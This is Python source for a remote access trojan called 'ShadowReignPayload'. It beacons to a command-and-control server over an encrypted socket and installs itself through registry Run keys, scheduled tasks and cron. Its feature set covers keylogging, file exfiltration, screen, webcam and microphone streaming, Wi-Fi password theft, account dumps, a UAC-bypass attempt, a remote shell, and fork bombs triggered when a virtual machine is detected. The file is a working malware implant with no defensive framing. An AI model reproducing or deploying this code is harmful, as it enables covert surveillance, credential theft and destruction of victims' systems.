import socket
import json
import os
import threading
import subprocess
import platform
import shutil
import pynput.keyboard as kb
import mss
import cv2
import pyaudio
import wave
import pyttsx3
import psutil
import time
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import numpy as np
import random
import string

# Polymorphic Name Randomization
def rand_name(length=10):
    return ''.join(random.choices(string.ascii_letters, k=length))

class ShadowReignPayload:
    def __init__(self):
        self.c2 = ("192.168.1.133", 5251)
        self.KEY = b"ShadowReignBoss!"  # Matches GUI key
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connect()
        self.keylogger = None
        self.running = True
        self.command_queue = []
        self.persistence()

    def encrypt(self, data):
        cipher = AES.new(self.KEY, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode()
        ct = base64.b64encode(ct_bytes).decode()
        return f"{iv}:{ct}"

    def decrypt(self, data):
        iv, ct = data.split(":")
        iv = base64.b64decode(iv)
        ct = base64.b64decode(ct)
        cipher = AES.new(self.KEY, AES.MODE_CBC, iv=iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode()

    def connect(self):
        delay = 5
        while True:
            try:
                self.sock.connect(self.c2)
                self.send_info()
                break
            except:
                time.sleep(delay)
                delay = min(delay * 2, 60)

    def send_info(self):
        try:
            info = {
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "ip": socket.gethostbyname(socket.gethostname()),
                "cpu": psutil.cpu_percent(),
                "ram": psutil.virtual_memory().percent
            }
            self.sock.send(self.encrypt(json.dumps(info)).encode())
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def listen(self):
        threading.Thread(target=self._listen, daemon=True).start()

    def _listen(self):
        while self.running:
            try:
                data = self.sock.recv(8192).decode()
                if not data:
                    self.connect()
                    continue
                cmd = json.loads(self.decrypt(data))
                self.command_queue.append((cmd["command"], cmd.get("data")))
                self.execute_next()
            except:
                self.connect()

    def execute_next(self):
        if not self.command_queue:
            return
        command, data = self.command_queue.pop(0)
        handlers = {
            "keylogger_start": self.keylogger_start,
            "keylogger_stop": self.keylogger_stop,
            "keylogger_dump": self.keylogger_dump,
            "list_files": self.list_files,
            "upload_file": self.upload_file,
            "download_file": self.download_file,
            "screenshot": self.screenshot,
            "record_screen": self.record_screen,
            "webcam_snap": self.webcam_snap,
            "dump_hashes": self.dump_hashes,
            "steal_wifi": self.steal_wifi,
            "elevate_privileges": self.elevate_privileges,
            "jumpscare": self.jumpscare,
            "crash_system": self.crash_system,
            "fork_bomb": self.fork_bomb,
            "shell": self.shell,
            "stream_screen": self.stream_screen,
            "stream_webcam": self.stream_webcam,
            "stream_mic": self.stream_mic,
        }
        if command in handlers:
            try:
                handlers[command](data)
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": f"{command} failed: {str(e)}"})).encode())

    # Persistence
    def persistence(self):
        if platform.system() == "Windows":
            try:
                exe_path = os.path.join(os.getenv("APPDATA"), f"{rand_name()}.py")
                shutil.copy(__file__, exe_path)
                subprocess.Popen(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {rand_name()} /t REG_SZ /d "pythonw {exe_path}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.Popen(f'schtasks /create /tn {rand_name()} /tr "pythonw {exe_path}" /sc onlogon /rl highest', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        elif platform.system() == "Linux":
            try:
                cron = f"@reboot python3 {os.path.abspath(__file__)}"
                subprocess.Popen(f'(crontab -l; echo "{cron}") | crontab -', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

    # Anti-Analysis
    def anti_analysis(self):
        try:
            if platform.system() == "Windows":
                if "VMware" in subprocess.check_output("wmic bios get serialnumber", shell=True, stderr=subprocess.DEVNULL).decode():
                    self.crash_system(None)
                    exit(0)
            elif platform.system() == "Linux":
                if "virtual" in subprocess.check_output("uname -r", shell=True, stderr=subprocess.DEVNULL).decode().lower():
                    self.fork_bomb(None)
                    exit(0)
        except:
            pass

    # Feature Implementations
    def keylogger_start(self, _):
        if not self.keylogger:
            self.keylogger = Keylogger(self.sock, self.encrypt)
            self.keylogger.start()

    def keylogger_stop(self, _):
        if self.keylogger:
            self.keylogger.stop()
            self.keylogger = None

    def keylogger_dump(self, _):
        if self.keylogger:
            self.keylogger.dump()

    def list_files(self, _):
        try:
            files = os.listdir()
            self.sock.send(self.encrypt(json.dumps({"files": files})).encode())
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def upload_file(self, local_path):
        try:
            with open(local_path, "rb") as f:
                self.sock.send(self.encrypt(json.dumps({"file": base64.b64encode(f.read()).decode()})))
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def download_file(self, remote_path):
        try:
            with open(remote_path, "rb") as f:
                self.sock.send(self.encrypt(json.dumps({"file": base64.b64encode(f.read()).decode()})))
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def screenshot(self, _):
        try:
            with mss.mss() as sct:
                img = sct.grab(sct.monitors[1])
                img_np = np.array(img)
                _, buffer = cv2.imencode(".png", img_np)
                self.sock.send(self.encrypt(json.dumps({"screenshot": base64.b64encode(buffer).decode()})))
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def record_screen(self, _):
        try:
            sct = mss.mss()
            fourcc = cv2.VideoWriter_fourcc(*"XVID")
            out = cv2.VideoWriter("screen.avi", fourcc, 5.0, (1920, 1080))
            start = time.time()
            while time.time() - start < 10:
                img = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                out.write(frame)
                time.sleep(0.1)
            out.release()
            with open("screen.avi", "rb") as f:
                self.sock.send(self.encrypt(json.dumps({"video": base64.b64encode(f.read()).decode()})))
            os.remove("screen.avi")
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def webcam_snap(self, _):
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                _, buffer = cv2.imencode(".jpg", frame)
                self.sock.send(self.encrypt(json.dumps({"webcam": base64.b64encode(buffer).decode()})))
            cap.release()
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def dump_hashes(self, _):
        if platform.system() == "Windows":
            try:
                # Using wmic as a basic hash-like dump (not true hashes, but system creds)
                output = subprocess.check_output("wmic useraccount get name,sid", shell=True).decode()
                self.sock.send(self.encrypt(json.dumps({"hashes": base64.b64encode(output.encode()).decode()})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())
        else:
            try:
                output = subprocess.check_output("cat /etc/passwd", shell=True).decode()
                self.sock.send(self.encrypt(json.dumps({"hashes": base64.b64encode(output.encode()).decode()})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def steal_wifi(self, _):
        if platform.system() == "Windows":
            try:
                output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
                profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
                wifi_data = {}
                for profile in profiles:
                    details = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode()
                    wifi_data[profile] = details
                self.sock.send(self.encrypt(json.dumps(wifi_data)).encode())
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())
        else:
            self.sock.send(self.encrypt(json.dumps({"error": "WiFi stealing not fully supported on this OS"})))

    def elevate_privileges(self, _):
        if platform.system() == "Windows":
            try:
                subprocess.Popen('reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "pythonw {__file__}" /f', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.Popen('eventvwr.exe', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.sock.send(self.encrypt(json.dumps({"status": "Attempted privilege elevation"})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())
        else:
            self.sock.send(self.encrypt(json.dumps({"error": "Privilege elevation not supported on this OS"})))

    def jumpscare(self, _):
        try:
            engine = pyttsx3.init()
            engine.say("You’ve been owned, courtesy of the Boss!")
            engine.runAndWait()
            self.sock.send(self.encrypt(json.dumps({"status": "Jumpscare executed"})))
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def crash_system(self, _):
        if platform.system() == "Windows":
            try:
                while True:
                    threading.Thread(target=lambda: None).start()  # Thread bomb
                self.sock.send(self.encrypt(json.dumps({"status": "System crash attempted"})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())
        else:
            self.fork_bomb(None)

    def fork_bomb(self, _):
        if platform.system() == "Windows":
            try:
                subprocess.Popen("cmd /c :a & start cmd /c %0 & goto a", shell=True)
                self.sock.send(self.encrypt(json.dumps({"status": "Fork bomb launched"})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())
        elif platform.system() == "Linux":
            try:
                subprocess.Popen(":(){ :|: & };:", shell=True)
                self.sock.send(self.encrypt(json.dumps({"status": "Fork bomb launched"})))
            except Exception as e:
                self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def shell(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
            self.sock.send(self.encrypt(json.dumps({"output": output})))
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def stream_screen(self, _):
        try:
            sct = mss.mss()
            while self.running:
                img = sct.grab(sct.monitors[1])
                frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGRA2BGR)
                _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                self.sock.send(self.encrypt(json.dumps({"stream_frame": base64.b64encode(buffer).decode()})))
                time.sleep(0.1)
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def stream_webcam(self, _):
        try:
            cap = cv2.VideoCapture(0)
            while self.running:
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
                    self.sock.send(self.encrypt(json.dumps({"webcam_frame": base64.b64encode(buffer).decode()})))
                time.sleep(0.1)
            cap.release()
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

    def stream_mic(self, _):
        try:
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
            while self.running:
                audio_data = stream.read(1024)
                self.sock.send(self.encrypt(json.dumps({"mic_chunk": base64.b64encode(audio_data).decode()})))
                time.sleep(0.01)
            stream.stop_stream()
            stream.close()
            p.terminate()
        except Exception as e:
            self.sock.send(self.encrypt(json.dumps({"error": str(e)})).encode())

class Keylogger:
    def __init__(self, sock, encrypt_func):
        self.sock = sock
        self.encrypt = encrypt_func
        self.logs = ""
        self.active = False

    def on_press(self, key):
        if self.active:
            self.logs += str(key) + " "

    def start(self):
        self.active = True
        self.listener = kb.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.active = False
        self.listener.stop()

    def dump(self):
        self.sock.send(self.encrypt(json.dumps({"keylogs": self.logs})))
        self.logs = ""

if __name__ == "__main__":
    # Anti-Analysis
    payload = ShadowReignPayload()
    payload.anti_analysis()
    payload.listen()
